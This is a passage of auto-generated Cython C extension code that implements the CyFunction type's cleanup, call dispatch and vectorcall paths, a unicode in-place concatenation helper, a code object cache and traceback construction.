(m))->mm_class = NULL;\n        Py_XDECREF(cls);\n    }\n#endif\n#endif\n    Py_CLEAR(m->defaults_tuple);\n    Py_CLEAR(m->defaults_kwdict);\n    Py_CLEAR(m->func_annotations);\n    Py_CLEAR(m->func_is_coroutine);\n    if (m->defaults) {\n        PyObject **pydefaults = __Pyx_CyFunction_Defaults(PyObject *, m);\n        int i;\n        for (i = 0; i < m->defaults_pyobjects; i++)\n            Py_XDECREF(pydefaults[i]);\n        PyObject_Free(m->defaults);\n        m->defaults = NULL;\n    }\n    return 0;\n}\nstatic void __Pyx__CyFunction_dealloc(__pyx_CyFunctionObject *m)\n{\n    if (__Pyx_CyFunction_weakreflist(m) != NULL)\n        PyObject_ClearWeakRefs((PyObject *) m);\n    __Pyx_CyFunction_clear(m);\n    __Pyx_PyHeapTypeObject_GC_Del(m);\n}\nstatic void __Pyx_CyFunction_dealloc(__pyx_CyFunctionObject *m)\n{\n    PyObject_GC_UnTrack(m);\n    __Pyx__CyFunction_dealloc(m);\n}\nstatic int __Pyx_CyFunction_traverse(__pyx_CyFunctionObject *m, visitproc visit, void *arg)\n{\n    Py_VISIT(m->func_closure);\n#if CYTHON_COMPILING_IN_LIMITED_API\n    Py_VISIT(m->func);\n#else\n    Py_VISIT(((PyCFunctionObject*)m)->m_module);\n#endif\n    Py_VISIT(m->func_dict);\n    Py_VISIT(m->func_name);\n    Py_VISIT(m->func_qualname);\n    Py_VISIT(m->func_doc);\n    Py_VISIT(m->func_globals);\n    Py_VISIT(m->func_code);\n#if !CYTHON_COMPILING_IN_LIMITED_API\n    Py_VISIT(__Pyx_CyFunction_GetClassObj(m));\n#endif\n    Py_VISIT(m->defaults_tuple);\n    Py_VISIT(m->defaults_kwdict);\n    Py_VISIT(m->func_is_coroutine);\n    if (m->defaults) {\n        PyObject **pydefaults = __Pyx_CyFunction_Defaults(PyObject *, m);\n        int i;\n        for (i = 0; i < m->defaults_pyobjects; i++)\n            Py_VISIT(pydefaults[i]);\n    }\n    return 0;\n}\nstatic PyObject*\n__Pyx_CyFunction_repr(__pyx_CyFunctionObject *op)\n{\n#if PY_MAJOR_VERSION >= 3\n    return PyUnicode_FromFormat("<cyfunction %U at %p>",\n                                op->func_qualname, (void *)op);\n#else\n    return PyString_FromFormat("<cyfunction %s at %p>",\n                               PyString_AsString(op->func_qualname), (void *)op);\n#endif\n}\nstatic PyObject * __Pyx_CyFunction_CallMethod(PyObject *func, PyObject *self, PyObject *arg, PyObject *kw) {\n#if CYTHON_COMPILING_IN_LIMITED_API\n    PyObject *f = ((__pyx_CyFunctionObject*)func)->func;\n    PyObject *py_name = NULL;\n    PyCFunction meth;\n    int flags;\n    meth = PyCFunction_GetFunction(f);\n    if (unlikely(!meth)) return NULL;\n    flags = PyCFunction_GetFlags(f);\n    if (unlikely(flags < 0)) return NULL;\n#else\n    PyCFunctionObject* f = (PyCFunctionObject*)func;\n    PyCFunction meth = f->m_ml->ml_meth;\n    int flags = f->m_ml->ml_flags;\n#endif\n    Py_ssize_t size;\n    switch (flags & (METH_VARARGS | METH_KEYWORDS | METH_NOARGS | METH_O)) {\n    case METH_VARARGS:\n        if (likely(kw == NULL || PyDict_Size(kw) == 0))\n            return (*meth)(self, arg);\n        break;\n    case METH_VARARGS | METH_KEYWORDS:\n        return (*(PyCFunctionWithKeywords)(void*)meth)(self, arg, kw);\n    case METH_NOARGS:\n        if (likely(kw == NULL || PyDict_Size(kw) == 0)) {\n#if CYTHON_ASSUME_SAFE_MACROS\n            size = PyTuple_GET_SIZE(arg);\n#else\n            size = PyTuple_Size(arg);\n            if (unlikely(size < 0)) return NULL;\n#endif\n            if (likely(size == 0))\n                return (*meth)(self, NULL);\n#if CYTHON_COMPILING_IN_LIMITED_API\n            py_name = __Pyx_CyFunction_get_name((__pyx_CyFunctionObject*)func, NULL);\n            if (!py_name) return NULL;\n            PyErr_Format(PyExc_TypeError,\n                "%.200S() takes no arguments (%" CYTHON_FORMAT_SSIZE_T "d given)",\n                py_name, size);\n            Py_DECREF(py_name);\n#else\n            PyErr_Format(PyExc_TypeError,\n                "%.200s() takes no arguments (%" CYTHON_FORMAT_SSIZE_T "d given)",\n                f->m_ml->ml_name, size);\n#endif\n            return NULL;\n        }\n        break;\n    case METH_O:\n        if (likely(kw == NULL || PyDict_Size(kw) == 0)) {\n#if CYTHON_ASSUME_SAFE_MACROS\n            size = PyTuple_GET_SIZE(arg);\n#else\n            size = PyTuple_Size(arg);\n            if (unlikely(size < 0)) return NULL;\n#endif\n            if (likely(size == 1)) {\n                PyObject *result, *arg0;\n                #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS\n                arg0 = PyTuple_GET_ITEM(arg, 0);\n                #else\n                arg0 = __Pyx_PySequence_ITEM(arg, 0); if (unlikely(!arg0)) return NULL;\n                #endif\n                result = (*meth)(self, arg0);\n                #if !(CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS)\n                Py_DECREF(arg0);\n                #endif\n                return result;\n            }\n#if CYTHON_COMPILING_IN_LIMITED_API\n            py_name = __Pyx_CyFunction_get_name((__pyx_CyFunctionObject*)func, NULL);\n            if (!py_name) return NULL;\n            PyErr_Format(PyExc_TypeError,\n                "%.200S() takes exactly one argument (%" CYTHON_FORMAT_SSIZE_T "d given)",\n                py_name, size);\n            Py_DECREF(py_name);\n#else\n            PyErr_Format(PyExc_TypeError,\n                "%.200s() takes exactly one argument (%" CYTHON_FORMAT_SSIZE_T "d given)",\n                f->m_ml->ml_name, size);\n#endif\n            return NULL;\n        }\n        break;\n    default:\n        PyErr_SetString(PyExc_SystemError, "Bad call flags for CyFunction");\n        return NULL;\n    }\n#if CYTHON_COMPILING_IN_LIMITED_API\n    py_name = __Pyx_CyFunction_get_name((__pyx_CyFunctionObject*)func, NULL);\n    if (!py_name) return NULL;\n    PyErr_Format(PyExc_TypeError, "%.200S() takes no keyword arguments",\n                 py_name);\n    Py_DECREF(py_name);\n#else\n    PyErr_Format(PyExc_TypeError, "%.200s() takes no keyword arguments",\n                 f->m_ml->ml_name);\n#endif\n    return NULL;\n}\nstatic CYTHON_INLINE PyObject *__Pyx_CyFunction_Call(PyObject *func, PyObject *arg, PyObject *kw) {\n    PyObject *self, *result;\n#if CYTHON_COMPILING_IN_LIMITED_API\n    self = PyCFunction_GetSelf(((__pyx_CyFunctionObject*)func)->func);\n    if (unlikely(!self) && PyErr_Occurred()) return NULL;\n#else\n    self = ((PyCFunctionObject*)func)->m_self;\n#endif\n    result = __Pyx_CyFunction_CallMethod(func, self, arg, kw);\n    return result;\n}\nstatic PyObject *__Pyx_CyFunction_CallAsMethod(PyObject *func, PyObject *args, PyObject *kw) {\n    PyObject *result;\n    __pyx_CyFunctionObject *cyfunc = (__pyx_CyFunctionObject *) func;\n#if CYTHON_METH_FASTCALL\n     __pyx_vectorcallfunc vc = __Pyx_CyFunction_func_vectorcall(cyfunc);\n    if (vc) {\n#if CYTHON_ASSUME_SAFE_MACROS\n        return __Pyx_PyVectorcall_FastCallDict(func, vc, &PyTuple_GET_ITEM(args, 0), (size_t)PyTuple_GET_SIZE(args), kw);\n#else\n        (void) &__Pyx_PyVectorcall_FastCallDict;\n        return PyVectorcall_Call(func, args, kw);\n#endif\n    }\n#endif\n    if ((cyfunc->flags & __Pyx_CYFUNCTION_CCLASS) && !(cyfunc->flags & __Pyx_CYFUNCTION_STATICMETHOD)) {\n        Py_ssize_t argc;\n        PyObject *new_args;\n        PyObject *self;\n#if CYTHON_ASSUME_SAFE_MACROS\n        argc = PyTuple_GET_SIZE(args);\n#else\n        argc = PyTuple_Size(args);\n        if (unlikely(!argc) < 0) return NULL;\n#endif\n        new_args = PyTuple_GetSlice(args, 1, argc);\n        if (unlikely(!new_args))\n            return NULL;\n        self = PyTuple_GetItem(args, 0);\n        if (unlikely(!self)) {\n            Py_DECREF(new_args);\n#if PY_MAJOR_VERSION > 2\n            PyErr_Format(PyExc_TypeError,\n                         "unbound method %.200S() needs an argument",\n                         cyfunc->func_qualname);\n#else\n            PyErr_SetString(PyExc_TypeError,\n                            "unbound method needs an argument");\n#endif\n            return NULL;\n        }\n        result = __Pyx_CyFunction_CallMethod(func, self, new_args, kw);\n        Py_DECREF(new_args);\n    } else {\n        result = __Pyx_CyFunction_Call(func, args, kw);\n    }\n    return result;\n}\n#if CYTHON_METH_FASTCALL\nstatic CYTHON_INLINE int __Pyx_CyFunction_Vectorcall_CheckArgs(__pyx_CyFunctionObject *cyfunc, Py_ssize_t nargs, PyObject *kwnames)\n{\n    int ret = 0;\n    if ((cyfunc->flags & __Pyx_CYFUNCTION_CCLASS) && !(cyfunc->flags & __Pyx_CYFUNCTION_STATICMETHOD)) {\n        if (unlikely(nargs < 1)) {\n            PyErr_Format(PyExc_TypeError, "%.200s() needs an argument",\n                         ((PyCFunctionObject*)cyfunc)->m_ml->ml_name);\n            return -1;\n        }\n        ret = 1;\n    }\n    if (unlikely(kwnames) && unlikely(PyTuple_GET_SIZE(kwnames))) {\n        PyErr_Format(PyExc_TypeError,\n                     "%.200s() takes no keyword arguments", ((PyCFunctionObject*)cyfunc)->m_ml->ml_name);\n        return -1;\n    }\n    return ret;\n}\nstatic PyObject * __Pyx_CyFunction_Vectorcall_NOARGS(PyObject *func, PyObject *const *args, size_t nargsf, PyObject *kwnames)\n{\n    __pyx_CyFunctionObject *cyfunc = (__pyx_CyFunctionObject *)func;\n    PyMethodDef* def = ((PyCFunctionObject*)cyfunc)->m_ml;\n#if CYTHON_BACKPORT_VECTORCALL\n    Py_ssize_t nargs = (Py_ssize_t)nargsf;\n#else\n    Py_ssize_t nargs = PyVectorcall_NARGS(nargsf);\n#endif\n    PyObject *self;\n    switch (__Pyx_CyFunction_Vectorcall_CheckArgs(cyfunc, nargs, kwnames)) {\n    case 1:\n        self = args[0];\n        args += 1;\n        nargs -= 1;\n        break;\n    case 0:\n        self = ((PyCFunctionObject*)cyfunc)->m_self;\n        break;\n    default:\n        return NULL;\n    }\n    if (unlikely(nargs != 0)) {\n        PyErr_Format(PyExc_TypeError,\n            "%.200s() takes no arguments (%" CYTHON_FORMAT_SSIZE_T "d given)",\n            def->ml_name, nargs);\n        return NULL;\n    }\n    return def->ml_meth(self, NULL);\n}\nstatic PyObject * __Pyx_CyFunction_Vectorcall_O(PyObject *func, PyObject *const *args, size_t nargsf, PyObject *kwnames)\n{\n    __pyx_CyFunctionObject *cyfunc = (__pyx_CyFunctionObject *)func;\n    PyMethodDef* def = ((PyCFunctionObject*)cyfunc)->m_ml;\n#if CYTHON_BACKPORT_VECTORCALL\n    Py_ssize_t nargs = (Py_ssize_t)nargsf;\n#else\n    Py_ssize_t nargs = PyVectorcall_NARGS(nargsf);\n#endif\n    PyObject *self;\n    switch (__Pyx_CyFunction_Vectorcall_CheckArgs(cyfunc, nargs, kwnames)) {\n    case 1:\n        self = args[0];\n        args += 1;\n        nargs -= 1;\n        break;\n    case 0:\n        self = ((PyCFunctionObject*)cyfunc)->m_self;\n        break;\n    default:\n        return NULL;\n    }\n    if (unlikely(nargs != 1)) {\n        PyErr_Format(PyExc_TypeError,\n            "%.200s() takes exactly one argument (%" CYTHON_FORMAT_SSIZE_T "d given)",\n            def->ml_name, nargs);\n        return NULL;\n    }\n    return def->ml_meth(self, args[0]);\n}\nstatic PyObject * __Pyx_CyFunction_Vectorcall_FASTCALL_KEYWORDS(PyObject *func, PyObject *const *args, size_t nargsf, PyObject *kwnames)\n{\n    __pyx_CyFunctionObject *cyfunc = (__pyx_CyFunctionObject *)func;\n    PyMethodDef* def = ((PyCFunctionObject*)cyfunc)->m_ml;\n#if CYTHON_BACKPORT_VECTORCALL\n    Py_ssize_t nargs = (Py_ssize_t)nargsf;\n#else\n    Py_ssize_t nargs = PyVectorcall_NARGS(nargsf);\n#endif\n    PyObject *self;\n    switch (__Pyx_CyFunction_Vectorcall_CheckArgs(cyfunc, nargs, NULL)) {\n    case 1:\n        self = args[0];\n        args += 1;\n        nargs -= 1;\n        break;\n    case 0:\n        self = ((PyCFunctionObject*)cyfunc)->m_self;\n        break;\n    default:\n        return NULL;\n    }\n    return ((_PyCFunctionFastWithKeywords)(void(*)(void))def->ml_meth)(self, args, nargs, kwnames);\n}\nstatic PyObject * __Pyx_CyFunction_Vectorcall_FASTCALL_KEYWORDS_METHOD(PyObject *func, PyObject *const *args, size_t nargsf, PyObject *kwnames)\n{\n    __pyx_CyFunctionObject *cyfunc = (__pyx_CyFunctionObject *)func;\n    PyMethodDef* def = ((PyCFunctionObject*)cyfunc)->m_ml;\n    PyTypeObject *cls = (PyTypeObject *) __Pyx_CyFunction_GetClassObj(cyfunc);\n#if CYTHON_BACKPORT_VECTORCALL\n    Py_ssize_t nargs = (Py_ssize_t)nargsf;\n#else\n    Py_ssize_t nargs = PyVectorcall_NARGS(nargsf);\n#endif\n    PyObject *self;\n    switch (__Pyx_CyFunction_Vectorcall_CheckArgs(cyfunc, nargs, NULL)) {\n    case 1:\n        self = args[0];\n        args += 1;\n        nargs -= 1;\n        break;\n    case 0:\n        self = ((PyCFunctionObject*)cyfunc)->m_self;\n        break;\n    default:\n        return NULL;\n    }\n    return ((__Pyx_PyCMethod)(void(*)(void))def->ml_meth)(self, cls, args, (size_t)nargs, kwnames);\n}\n#endif\n#if CYTHON_USE_TYPE_SPECS\nstatic PyType_Slot __pyx_CyFunctionType_slots[] = {\n    {Py_tp_dealloc, (void *)__Pyx_CyFunction_dealloc},\n    {Py_tp_repr, (void *)__Pyx_CyFunction_repr},\n    {Py_tp_call, (void *)__Pyx_CyFunction_CallAsMethod},\n    {Py_tp_traverse, (void *)__Pyx_CyFunction_traverse},\n    {Py_tp_clear, (void *)__Pyx_CyFunction_clear},\n    {Py_tp_methods, (void *)__pyx_CyFunction_methods},\n    {Py_tp_members, (void *)__pyx_CyFunction_members},\n    {Py_tp_getset, (void *)__pyx_CyFunction_getsets},\n    {Py_tp_descr_get, (void *)__Pyx_PyMethod_New},\n    {0, 0},\n};\nstatic PyType_Spec __pyx_CyFunctionType_spec = {\n    __PYX_TYPE_MODULE_PREFIX "cython_function_or_method",\n    sizeof(__pyx_CyFunctionObject),\n    0,\n#ifdef Py_TPFLAGS_METHOD_DESCRIPTOR\n    Py_TPFLAGS_METHOD_DESCRIPTOR |\n#endif\n#if (defined(_Py_TPFLAGS_HAVE_VECTORCALL) && CYTHON_METH_FASTCALL)\n    _Py_TPFLAGS_HAVE_VECTORCALL |\n#endif\n    Py_TPFLAGS_DEFAULT | Py_TPFLAGS_HAVE_GC | Py_TPFLAGS_BASETYPE,\n    __pyx_CyFunctionType_slots\n};\n#else\nstatic PyTypeObject __pyx_CyFunctionType_type = {\n    PyVarObject_HEAD_INIT(0, 0)\n    __PYX_TYPE_MODULE_PREFIX "cython_function_or_method",\n    sizeof(__pyx_CyFunctionObject),\n    0,\n    (destructor) __Pyx_CyFunction_dealloc,\n#if !CYTHON_METH_FASTCALL\n    0,\n#elif CYTHON_BACKPORT_VECTORCALL\n    (printfunc)offsetof(__pyx_CyFunctionObject, func_vectorcall),\n#else\n    offsetof(PyCFunctionObject, vectorcall),\n#endif\n    0,\n    0,\n#if PY_MAJOR_VERSION < 3\n    0,\n#else\n    0,\n#endif\n    (reprfunc) __Pyx_CyFunction_repr,\n    0,\n    0,\n    0,\n    0,\n    __Pyx_CyFunction_CallAsMethod,\n    0,\n    0,\n    0,\n    0,\n#ifdef Py_TPFLAGS_METHOD_DESCRIPTOR\n    Py_TPFLAGS_METHOD_DESCRIPTOR |\n#endif\n#if defined(_Py_TPFLAGS_HAVE_VECTORCALL) && CYTHON_METH_FASTCALL\n    _Py_TPFLAGS_HAVE_VECTORCALL |\n#endif\n    Py_TPFLAGS_DEFAULT | Py_TPFLAGS_HAVE_GC | Py_TPFLAGS_BASETYPE,\n    0,\n    (traverseproc) __Pyx_CyFunction_traverse,\n    (inquiry) __Pyx_CyFunction_clear,\n    0,\n#if PY_VERSION_HEX < 0x030500A0\n    offsetof(__pyx_CyFunctionObject, func_weakreflist),\n#else\n    offsetof(PyCFunctionObject, m_weakreflist),\n#endif\n    0,\n    0,\n    __pyx_CyFunction_methods,\n    __pyx_CyFunction_members,\n    __pyx_CyFunction_getsets,\n    0,\n    0,\n    __Pyx_PyMethod_New,\n    0,\n    offsetof(__pyx_CyFunctionObject, func_dict),\n    0,\n    0,\n    0,\n    0,\n    0,\n    0,\n    0,\n    0,\n    0,\n    0,\n    0,\n    0,\n#if PY_VERSION_HEX >= 0x030400a1\n    0,\n#endif\n#if PY_VERSION_HEX >= 0x030800b1 && (!CYTHON_COMPILING_IN_PYPY || PYPY_VERSION_NUM >= 0x07030800)\n    0,\n#endif\n#if __PYX_NEED_TP_PRINT_SLOT\n    0,\n#endif\n#if PY_VERSION_HEX >= 0x030C0000\n    0,\n#endif\n#if CYTHON_COMPILING_IN_PYPY && PY_VERSION_HEX >= 0x03090000 && PY_VERSION_HEX < 0x030a0000\n    0,\n#endif\n};\n#endif\nstatic int __pyx_CyFunction_init(PyObject *module) {\n#if CYTHON_USE_TYPE_SPECS\n    __pyx_CyFunctionType = __Pyx_FetchCommonTypeFromSpec(module, &__pyx_CyFunctionType_spec, NULL);\n#else\n    CYTHON_UNUSED_VAR(module);\n    __pyx_CyFunctionType = __Pyx_FetchCommonType(&__pyx_CyFunctionType_type);\n#endif\n    if (unlikely(__pyx_CyFunctionType == NULL)) {\n        return -1;\n    }\n    return 0;\n}\nstatic CYTHON_INLINE void *__Pyx_CyFunction_InitDefaults(PyObject *func, size_t size, int pyobjects) {\n    __pyx_CyFunctionObject *m = (__pyx_CyFunctionObject *) func;\n    m->defaults = PyObject_Malloc(size);\n    if (unlikely(!m->defaults))\n        return PyErr_NoMemory();\n    memset(m->defaults, 0, size);\n    m->defaults_pyobjects = pyobjects;\n    m->defaults_size = size;\n    return m->defaults;\n}\nstatic CYTHON_INLINE void __Pyx_CyFunction_SetDefaultsTuple(PyObject *func, PyObject *tuple) {\n    __pyx_CyFunctionObject *m = (__pyx_CyFunctionObject *) func;\n    m->defaults_tuple = tuple;\n    Py_INCREF(tuple);\n}\nstatic CYTHON_INLINE void __Pyx_CyFunction_SetDefaultsKwDict(PyObject *func, PyObject *dict) {\n    __pyx_CyFunctionObject *m = (__pyx_CyFunctionObject *) func;\n    m->defaults_kwdict = dict;\n    Py_INCREF(dict);\n}\nstatic CYTHON_INLINE void __Pyx_CyFunction_SetAnnotationsDict(PyObject *func, PyObject *dict) {\n    __pyx_CyFunctionObject *m = (__pyx_CyFunctionObject *) func;\n    m->func_annotations = dict;\n    Py_INCREF(dict);\n}\n\n/* CythonFunction */\nstatic PyObject *__Pyx_CyFunction_New(PyMethodDef *ml, int flags, PyObject* qualname,\n                                      PyObject *closure, PyObject *module, PyObject* globals, PyObject* code) {\n    PyObject *op = __Pyx_CyFunction_Init(\n        PyObject_GC_New(__pyx_CyFunctionObject, __pyx_CyFunctionType),\n        ml, flags, qualname, closure, module, globals, code\n    );\n    if (likely(op)) {\n        PyObject_GC_Track(op);\n    }\n    return op;\n}\n\n/* UnicodeConcatInPlace */\n# if CYTHON_COMPILING_IN_CPYTHON && PY_MAJOR_VERSION >= 3\nstatic int\n__Pyx_unicode_modifiable(PyObject *unicode)\n{\n    if (Py_REFCNT(unicode) != 1)\n        return 0;\n    if (!PyUnicode_CheckExact(unicode))\n        return 0;\n    if (PyUnicode_CHECK_INTERNED(unicode))\n        return 0;\n    return 1;\n}\nstatic CYTHON_INLINE PyObject *__Pyx_PyUnicode_ConcatInPlaceImpl(PyObject **p_left, PyObject *right\n        #if CYTHON_REFNANNY\n        , void* __pyx_refnanny\n        #endif\n    ) {\n    PyObject *left = *p_left;\n    Py_ssize_t left_len, right_len, new_len;\n    if (unlikely(__Pyx_PyUnicode_READY(left) == -1))\n        return NULL;\n    if (unlikely(__Pyx_PyUnicode_READY(right) == -1))\n        return NULL;\n    left_len = PyUnicode_GET_LENGTH(left);\n    if (left_len == 0) {\n        Py_INCREF(right);\n        return right;\n    }\n    right_len = PyUnicode_GET_LENGTH(right);\n    if (right_len == 0) {\n        Py_INCREF(left);\n        return left;\n    }\n    if (unlikely(left_len > PY_SSIZE_T_MAX - right_len)) {\n        PyErr_SetString(PyExc_OverflowError,\n                        "strings are too large to concat");\n        return NULL;\n    }\n    new_len = left_len + right_len;\n    if (__Pyx_unicode_modifiable(left)\n            && PyUnicode_CheckExact(right)\n            && PyUnicode_KIND(right) <= PyUnicode_KIND(left)\n            && !(PyUnicode_IS_ASCII(left) && !PyUnicode_IS_ASCII(right))) {\n        __Pyx_GIVEREF(*p_left);\n        if (unlikely(PyUnicode_Resize(p_left, new_len) != 0)) {\n            __Pyx_GOTREF(*p_left);\n            return NULL;\n        }\n        __Pyx_INCREF(*p_left);\n        #if PY_VERSION_HEX >= 0x030D0000\n        if (unlikely(PyUnicode_CopyCharacters(*p_left, left_len, right, 0, right_len) < 0)) return NULL;\n        #else\n        _PyUnicode_FastCopyCharacters(*p_left, left_len, right, 0, right_len);\n        #endif\n        return *p_left;\n    } else {\n        return __Pyx_PyUnicode_Concat(left, right);\n    }\n  }\n#endif\n\n/* CLineInTraceback */\n#ifndef CYTHON_CLINE_IN_TRACEBACK\nstatic int __Pyx_CLineForTraceback(PyThreadState *tstate, int c_line) {\n    PyObject *use_cline;\n    PyObject *ptype, *pvalue, *ptraceback;\n#if CYTHON_COMPILING_IN_CPYTHON\n    PyObject **cython_runtime_dict;\n#endif\n    CYTHON_MAYBE_UNUSED_VAR(tstate);\n    if (unlikely(!__pyx_cython_runtime)) {\n        return c_line;\n    }\n    __Pyx_ErrFetchInState(tstate, &ptype, &pvalue, &ptraceback);\n#if CYTHON_COMPILING_IN_CPYTHON\n    cython_runtime_dict = _PyObject_GetDictPtr(__pyx_cython_runtime);\n    if (likely(cython_runtime_dict)) {\n        __PYX_PY_DICT_LOOKUP_IF_MODIFIED(\n            use_cline, *cython_runtime_dict,\n            __Pyx_PyDict_GetItemStr(*cython_runtime_dict, __pyx_n_s_cline_in_traceback))\n    } else\n#endif\n    {\n      PyObject *use_cline_obj = __Pyx_PyObject_GetAttrStrNoError(__pyx_cython_runtime, __pyx_n_s_cline_in_traceback);\n      if (use_cline_obj) {\n        use_cline = PyObject_Not(use_cline_obj) ? Py_False : Py_True;\n        Py_DECREF(use_cline_obj);\n      } else {\n        PyErr_Clear();\n        use_cline = NULL;\n      }\n    }\n    if (!use_cline) {\n        c_line = 0;\n        (void) PyObject_SetAttr(__pyx_cython_runtime, __pyx_n_s_cline_in_traceback, Py_False);\n    }\n    else if (use_cline == Py_False || (use_cline != Py_True && PyObject_Not(use_cline) != 0)) {\n        c_line = 0;\n    }\n    __Pyx_ErrRestoreInState(tstate, ptype, pvalue, ptraceback);\n    return c_line;\n}\n#endif\n\n/* CodeObjectCache */\n#if !CYTHON_COMPILING_IN_LIMITED_API\nstatic int __pyx_bisect_code_objects(__Pyx_CodeObjectCacheEntry* entries, int count, int code_line) {\n    int start = 0, mid = 0, end = count - 1;\n    if (end >= 0 && code_line > entries[end].code_line) {\n        return count;\n    }\n    while (start < end) {\n        mid = start + (end - start) / 2;\n        if (code_line < entries[mid].code_line) {\n            end = mid;\n        } else if (code_line > entries[mid].code_line) {\n             start = mid + 1;\n        } else {\n            return mid;\n        }\n    }\n    if (code_line <= entries[mid].code_line) {\n        return mid;\n    } else {\n        return mid + 1;\n    }\n}\nstatic PyCodeObject *__pyx_find_code_object(int code_line) {\n    PyCodeObject* code_object;\n    int pos;\n    if (unlikely(!code_line) || unlikely(!__pyx_code_cache.entries)) {\n        return NULL;\n    }\n    pos = __pyx_bisect_code_objects(__pyx_code_cache.entries, __pyx_code_cache.count, code_line);\n    if (unlikely(pos >= __pyx_code_cache.count) || unlikely(__pyx_code_cache.entries[pos].code_line != code_line)) {\n        return NULL;\n    }\n    code_object = __pyx_code_cache.entries[pos].code_object;\n    Py_INCREF(code_object);\n    return code_object;\n}\nstatic void __pyx_insert_code_object(int code_line, PyCodeObject* code_object) {\n    int pos, i;\n    __Pyx_CodeObjectCacheEntry* entries = __pyx_code_cache.entries;\n    if (unlikely(!code_line)) {\n        return;\n    }\n    if (unlikely(!entries)) {\n        entries = (__Pyx_CodeObjectCacheEntry*)PyMem_Malloc(64*sizeof(__Pyx_CodeObjectCacheEntry));\n        if (likely(entries)) {\n            __pyx_code_cache.entries = entries;\n            __pyx_code_cache.max_count = 64;\n            __pyx_code_cache.count = 1;\n            entries[0].code_line = code_line;\n            entries[0].code_object = code_object;\n            Py_INCREF(code_object);\n        }\n        return;\n    }\n    pos = __pyx_bisect_code_objects(__pyx_code_cache.entries, __pyx_code_cache.count, code_line);\n    if ((pos < __pyx_code_cache.count) && unlikely(__pyx_code_cache.entries[pos].code_line == code_line)) {\n        PyCodeObject* tmp = entries[pos].code_object;\n        entries[pos].code_object = code_object;\n        Py_DECREF(tmp);\n        return;\n    }\n    if (__pyx_code_cache.count == __pyx_code_cache.max_count) {\n        int new_max = __pyx_code_cache.max_count + 64;\n        entries = (__Pyx_CodeObjectCacheEntry*)PyMem_Realloc(\n            __pyx_code_cache.entries, ((size_t)new_max) * sizeof(__Pyx_CodeObjectCacheEntry));\n        if (unlikely(!entries)) {\n            return;\n        }\n        __pyx_code_cache.entries = entries;\n        __pyx_code_cache.max_count = new_max;\n    }\n    for (i=__pyx_code_cache.count; i>pos; i--) {\n        entries[i] = entries[i-1];\n    }\n    entries[pos].code_line = code_line;\n    entries[pos].code_object = code_object;\n    __pyx_code_cache.count++;\n    Py_INCREF(code_object);\n}\n#endif\n\n/* AddTraceback */\n#include "compile.h"\n#include "frameobject.h"\n#include "traceback.h"\n#if PY_VERSION_HEX >= 0x030b00a6 && !CYTHON_COMPILING_IN_LIMITED_API\n  #ifndef Py_BUILD_CORE\n    #define Py_BUILD_CORE 1\n  #endif\n  #include "internal/pycore_frame.h"\n#endif\n#if CYTHON_COMPILING_IN_LIMITED_API\nstatic PyObject *__Pyx_PyCode_Replace_For_AddTraceback(PyObject *code, PyObject *scratch_dict,\n                                                       PyObject *firstlineno, PyObject *name) {\n    PyObject *replace = NULL;\n    if (unlikely(PyDict_SetItemString(scratch_dict, "co_firstlineno", firstlineno))) return NULL;\n    if (unlikely(PyDict_SetItemString(scratch_dict, "co_name", name))) return NULL;\n    replace = PyObject_GetAttrString(code, "replace");\n    if (likely(replace)) {\n        PyObject *result;\n        result = PyObject_Call(replace, __pyx_empty_tuple, scratch_dict);\n        Py_DECREF(replace);\n        return result;\n    }\n    #if __PYX_LIMITED_VERSION_HEX < 0x030780000\n    PyErr_Clear();\n    {\n        PyObject *compiled = NULL, *result = NULL;\n        if (unlikely(PyDict_SetItemString(scratch_dict, "code", code))) return NULL;\n        if (unlikely(PyDict_SetItemString(scratch_dict, "type", (PyObject*)(&PyType_Type)))) return NULL;\n        compiled = Py_CompileString(\n            "out = type(code)(\\n"\n            "  code.co_argcount, code.co_kwonlyargcount, code.co_nlocals, code.co_stacksize,\\n"\n            "  code.co_flags, code.co_code, code.co_consts, code.co_names,\\n"\n            "  code.co_varnames, code.co_filename, co_name, co_firstlineno,\\n"\n            "  code.co_lnotab)\\n", "<dummy>", Py_file_input);\n        if (!compiled) return NULL;\n        result = PyEval_EvalCode(compiled, scratch_dict, scratch_dict);\n        Py_DECREF(compiled);\n        if (!result) PyErr_Print();\n        Py_DECREF(result);\n        result = PyDict_GetItemString(scratch_dict, "out");\n        if (result) Py_INCREF(result);\n        return result;\n    }\n    #endif\n}\nstatic void __Pyx_AddTraceback(const char *funcname, int c_line,\n                               int py_line, const char *filename) {\n    PyObject *code_object = NULL, *py_py_line = NULL, *py_funcname = NULL, *dict = NULL;\n    PyObject *replace = NULL, *getframe = NULL, *frame = NULL;\n    PyObject *exc_type, *exc_value, *exc_traceback;\n    int success = 0;\n    if (c_line) {\n        (void) __pyx_cfilenm;\n        (void) __Pyx_CLineForTraceback(__Pyx_PyThreadState_Current, c_line);\n    }\n    PyErr_Fetch(&exc_type, &exc_value, &exc_traceback);\n    code_object = Py_CompileString("_getframe()", filename, Py_eval_input);\n    if (unlikely(!code_object)) goto bad;\n    py_py_line = PyLong_FromLong(py_line);\n    if (unlikely(!py_py_line)) goto bad;\n    py_funcname = PyUnicode_FromString(funcname);\n    if (unlikely(!py_funcname)) goto bad;\n    dict = PyDict_New();\n    if (unlikely(!dict)) goto bad;\n    {\n        PyObject *old_code_object = code_object;\n        code_object = __Pyx_PyCode_Replace_For_AddTraceback(code_object, dict, py_py_line, py_funcname);\n        Py_DECREF(old_code_object);\n    }\n    if (unlikely(!code_object)) goto bad;\n    getframe = PySys_GetObject("_getframe");\n    if (unlikely(!getframe)) goto bad;\n    if (unlikely(PyDict_SetItemString(dict, "_getframe", getframe))) goto bad;\n    frame = PyEval_EvalCode(code_object, dict, dict);\n    if (unlikely(!frame) || frame == Py_None) goto bad;\n    success = 1;\n  bad:\n    PyErr_Restore(exc_type, exc_value, exc_traceback);\n    Py_XDECREF(code_object);\n    Py_XDECREF(py_py_line);\n    Py_XDECREF(py_funcname);\n    Py_XDECREF(dict);\n    Py_XDECREF(replace);\n    if (success) {\n        PyTraceBack_Here(\n            (struct _frame*)frame);\n    }\n    Py_XDECREF(frame);\n}\n#else\nstatic PyCodeObject* __Pyx_CreateCodeObjectForTraceback(\n            const char *funcname, int c_line,\n            int py_line, const char *filename) {\n    PyCodeObject *py_code = NULL;\n    PyObject *py_funcname = NULL;\n    #if PY_MAJOR_VERSION < 3\n    PyObject *py_srcfile = NULL;\n    py_srcfile = PyString_FromString(filename);\n    if (!py_srcfile) goto bad;\n    #endif\n    if (c_line) {\n        #if 